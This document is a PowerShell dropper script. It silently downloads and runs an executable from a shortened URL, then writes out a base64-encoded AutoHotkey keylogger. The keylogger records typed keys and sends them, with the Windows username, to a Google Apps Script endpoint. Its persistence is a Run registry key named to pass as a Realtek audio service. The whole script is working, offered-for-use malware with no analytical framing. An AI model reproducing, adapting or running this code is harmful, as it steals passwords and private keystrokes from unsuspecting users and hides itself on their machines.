Set-StrictMode -Off
Write-Output "v1.0"
function base64ToFile($base64String,$scriptPath,$run = $false){
    $bytes = [System.Convert]::FromBase64String($base64String)

    [System.IO.File]::WriteAllBytes($scriptPath, $bytes)

    if($run){
        Start-Process $scriptPath
    }
}

$path = "$Env:TEMP\14660a3a-f06a-4bf0-b2c8-6955e879fa30.exe"
if (-Not (Test-Path -Path $path)){
    Start-BitsTransfer -Source "https://shorturl.at/rnxiX" -Destination $path
}
Write-Output "a"
Start-Process $path -ArgumentList '/silent' -Wait
Remove-Item -Path $path
Write-Output "b"
$ahk  = "I1JlcXVpcmVzIEF1dG9Ib3RrZXkgdjIuMA0KI1NpbmdsZUluc3RhbmNlIEZvcmNlDQoNCmdsb2JhbCBVU0VSTkFNRSA6PSBFbnZHZXQoIlVTRVJOQU1FIikNCmdsb2JhbCB0ZXh0IDo9ICcnDQpnbG9iYWwgZXBvY2hUaW1lIDo9IDANCg0KdXJsIDo9IEZvcm1hdCgnaHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J3TlVhTTVrSEJFM0xzcXppSEQ3SVZneDBQLWpZWU1xVzhYNHcwaVliOHNaZlNLNUJpVlh3LXlIWUZoaUVYNUd3cVMvZXhlYz91c2VyPXsxfScsVVNFUk5BTUUpDQp3aHIgOj0gQ29tT2JqZWN0KCdXaW5IdHRwLldpbkh0dHBSZXF1ZXN0LjUuMScpDQp3aHIuT3BlbignR0VUJywgdXJsLCBGYWxzZSksIHdoci5TZW5kKCkNCg0KcmVwZWF0U3RyaW5nKHN0cmluZywgY291bnQpIHsNCiAgICByZXN1bHQgOj0gIiINCiAgICBMb29wIGNvdW50IHsNCiAgICAgICAgcmVzdWx0IC49IHN0cmluZw0KICAgIH0NCiAgICByZXR1cm4gcmVzdWx0DQp9DQoNClVybEVuY29kZShzdHIpIHsNCiAgICBlbmNvZGVkIDo9ICIiDQogICAgY2hhcnMgOj0gU3RyU3BsaXQoc3RyKSAgOyBTcGxpdCB0aGUgc3RyaW5nIGludG8gYW4gYXJyYXkgb2YgY2hhcmFjdGVycw0KICAgIGZvciBjaGFyIGluIGNoYXJzIHsNCiAgICAgICAgaWYgKGNoYXIgPSAiYG4iKSB7DQogICAgICAgICAgICBlbmNvZGVkIC49ICIlMEEiICA7IEVuY29kZSBuZXdsaW5lIGFzICUwQQ0KICAgICAgICB9IGVsc2UgaWYgKGNoYXIgPSAiYHIiKSB7DQogICAgICAgICAgICBlbmNvZGVkIC49ICIlMEQiICA7IEVuY29kZSBjYXJyaWFnZSByZXR1cm4gYXMgJTBEDQogICAgICAgIH0gZWxzZSBpZiAoUmVnRXhNYXRjaChjaGFyLCAiXltBLVphLXowLTldJCIpKSB7DQogICAgICAgICAgICBlbmNvZGVkIC49IGNoYXIgIDsgS2VlcCBhbHBoYW51bWVyaWMgY2hhcmFjdGVycyB1bmNoYW5nZWQNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIGVuY29kZWQgLj0gIiUiIC4gRm9ybWF0KCJ7Olh9IiwgT3JkKGNoYXIpKSAgOyBDb252ZXJ0IHRvIHVwcGVyY2FzZSBoZXhhZGVjaW1hbA0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiBlbmNvZGVkDQp9DQoNClNlbmQodHh0KXsNCiAgICA7dHh0IDo9IFN0clJlcGxhY2UodHh0LCAnICcsICclMjAnKSAgIDsgUmVwbGFjZSBzcGFjZXMgd2l0aCAlMjANCiAgICA7dHh0IDo9IFN0clJlcGxhY2UodHh0LCAnYG4nLCAnJTBBJykgIDsgUmVwbGFjZSBuZXcgbGluZXMgd2l0aCAlMEENCiAgICB0eHQgOj0gVXJsRW5jb2RlKHR4dCkNCiAgICB1cmwgOj0gRm9ybWF0KCdodHRwczovL3NjcmlwdC5nb29nbGUuY29tL21hY3Jvcy9zL0FLZnljYndOVWFNNWtIQkUzTHNxemlIRDdJVmd4MFAtallZTXFXOFg0dzBpWWI4c1pmU0s1QmlWWHcteUhZRmhpRVg1R3dxUy9leGVjP3VzZXI9ezF9JnE9ezJ9JyxVU0VSTkFNRSx0eHQpDQogICAgd2hyIDo9IENvbU9iamVjdCgnV2luSHR0cC5XaW5IdHRwUmVxdWVzdC41LjEnKQ0KICAgIHdoci5PcGVuKCdHRVQnLCB1cmwsIEZhbHNlKSwgd2hyLlNlbmQoKQ0KICAgIHJlc3BvbnNlIDo9IHdoci5SZXNwb25zZVRleHQNCn0NCkxvZyhrZXkpIHsNCiAgICBnbG9iYWwgdGV4dA0KICAgIGdsb2JhbCBlcG9jaFRpbWUNCiAgICBpZiAoa2V5PT0nQkFDS1NQQUNFJykgew0KICAgICAgICB0ZXh0IDo9IFN1YlN0cih0ZXh0LCAxLCBTdHJMZW4odGV4dCkgLSAxKQ0KICAgICAgICByZXR1cm4NCiAgICB9DQogICAgZXBvY2hUaW1lIDo9IEFfVGlja0NvdW50DQogICAgdGV4dCAuPSBrZXkNCn0NCn4wOjpMb2coJzAnKQ0KfjE6OkxvZygnMScpDQp+Mjo6TG9nKCcyJykNCn4zOjpMb2coJzMnKQ0KfjQ6OkxvZygnNCcpDQp+NTo6TG9nKCc1JykNCn42OjpMb2coJzYnKQ0Kfjc6OkxvZygnNycpDQp+ODo6TG9nKCc4JykNCn45OjpMb2coJzknKQ0KfmE6OkxvZygnYScpDQp+Yjo6TG9nKCdiJykNCn5jOjpMb2coJ2MnKQ0KfmQ6OkxvZygnZCcpDQp+ZTo6TG9nKCdlJykNCn5mOjpMb2coJ2YnKQ0Kfmc6OkxvZygnZycpDQp+aDo6TG9nKCdoJykNCn5pOjpMb2coJ2knKQ0Kfmo6OkxvZygnaicpDQp+azo6TG9nKCdrJykNCn5sOjpMb2coJ2wnKQ0Kfm06OkxvZygnbScpDQp+bjo6TG9nKCduJykNCn5vOjpMb2coJ28nKQ0KfnA6OkxvZygncCcpDQp+cTo6TG9nKCdxJykNCn5yOjpMb2coJ3InKQ0KfnM6OkxvZygncycpDQp+dDo6TG9nKCd0JykNCn51OjpMb2coJ3UnKQ0KfnY6OkxvZygndicpDQp+dzo6TG9nKCd3JykNCn54OjpMb2coJ3gnKQ0Kfnk6OkxvZygneScpDQp+ejo6TG9nKCd6JykNCg0KfithOjpMb2coJ0EnKQ0KfitiOjpMb2coJ0InKQ0KfitjOjpMb2coJ0MnKQ0KfitkOjpMb2coJ0QnKQ0KfitlOjpMb2coJ0UnKQ0KfitmOjpMb2coJ0YnKQ0KfitnOjpMb2coJ0cnKQ0KfitoOjpMb2coJ0gnKQ0KfitpOjpMb2coJ0knKQ0KfitqOjpMb2coJ0onKQ0KfitrOjpMb2coJ0snKQ0KfitsOjpMb2coJ0wnKQ0KfittOjpMb2coJ00nKQ0KfituOjpMb2coJ04nKQ0KfitvOjpMb2coJ08nKQ0KfitwOjpMb2coJ1AnKQ0KfitxOjpMb2coJ1EnKQ0KfityOjpMb2coJ1InKQ0KfitzOjpMb2coJ1MnKQ0Kfit0OjpMb2coJ1QnKQ0Kfit1OjpMb2coJ1UnKQ0Kfit2OjpMb2coJ1YnKQ0Kfit3OjpMb2coJ1cnKQ0Kfit4OjpMb2coJ1gnKQ0Kfit5OjpMb2coJ1knKQ0Kfit6OjpMb2coJ1onKQ0KDQp+KlNwYWNlOjpMb2coJyAnKQ0KfipFbnRlcjo6TG9nKCdgbicpDQp+KkJhY2tzcGFjZTo6TG9nKCdCQUNLU1BBQ0UnKQ0KflRhYjo6TG9nKCdgdCcpICA7IFRhYiB1c2luZyBlc2NhcGUgc2VxdWVuY2UNCg0KfisxOjpMb2coIiEiKQ0KfisyOjpMb2coIkAiKQ0KfiszOjpMb2coJ2AjJykNCn4rNDo6TG9nKCIkIikNCn4rNTo6TG9nKCIlIikNCn4rNjo6TG9nKCJeIikNCn4rNzo6TG9nKCImIikNCn4rODo6TG9nKCIqIikNCn4rOTo6TG9nKCIoIikNCn4rMDo6TG9nKCIpIikNCg0Kfi06OkxvZygnLScpDQp+Ky06OkxvZygnXycpDQp+PTo6TG9nKCc9JykNCn4rPTo6TG9nKCcrJykNCg0Kfls6OkxvZygnWycpDQp+XTo6TG9nKCddJykNCn5cOjpMb2coJ1wnKQ0Kfjs6OkxvZygnOycpDQp+YDo6TG9nKCdgYCcpDQp+K2A6OkxvZygnficpDQp+LDo6TG9nKCcsJykNCn4rLDo6TG9nKCc8JykNCn4rLjo6TG9nKCc+JykNCn4rLzo6TG9nKCc/JykNCn4uOjpMb2coJy4nKQ0Kfi86OkxvZygnLycpDQp+K1s6OkxvZygneycpDQp+K106OkxvZygnfScpDQp+K1w6OkxvZygnfCcpDQp+Kzs6OkxvZygnOicpDQp+Kyc6OkxvZygnIicpDQp+Jzo6TG9nKCInIikNCkxvb3Agew0KICAgIGdsb2JhbCBlcG9jaFRpbWUsIHRleHQNCiAgICB0aWNrIDo9IEFfVGlja0NvdW50ICA7IEdldCBjdXJyZW50IFVUQyB0aW1lDQogICAgaWYgKCh0aWNrIC0gZXBvY2hUaW1lKS8xMDAwID4gNSkgJiYgKHRleHQgIT0gJycpIHsgIDsgQ29tcGFyZSBpbiBtaWxsaXNlY29uZHMgKDEwIHNlY29uZHMpDQogICAgICAgIFNlbmQodGV4dCkNCiAgICAgICAgdGV4dCA6PSAnJw0KICAgICAgICBlcG9jaFRpbWUgOj0gdGljaw0KICAgIH0NCiAgICBTbGVlcCgxMDApDQp9"
$apath = "$Env:USERPROFILE\RtkAudUService64.ahk"
base64ToFile $ahk $apath $true
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'RtkAudUService64' -Value $apath
